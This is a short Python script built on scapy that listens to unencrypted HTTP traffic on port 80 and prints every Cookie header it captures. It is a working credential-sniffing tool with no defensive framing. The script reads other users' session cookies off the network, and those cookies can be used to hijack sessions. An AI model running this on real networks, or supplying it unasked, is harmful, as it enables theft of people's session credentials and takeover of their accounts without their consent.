from scapy.all import *
import re

def cookieSniffer(packet):
    tcp = packet.getlayer('TCP')
    cookie = re.search(r'Cookie: (.+)', str(tcp.payload))
    if cookie:
        print('--- COOKIE SNIFFED\n[{}]'.format(cookie.group()))

def main():
    print('+++ START SNIFFING COOKIE')
    sniff(filter='tcp port 80', store=0, prn=cookieSniffer)

if __name__ == "__main__":
    main()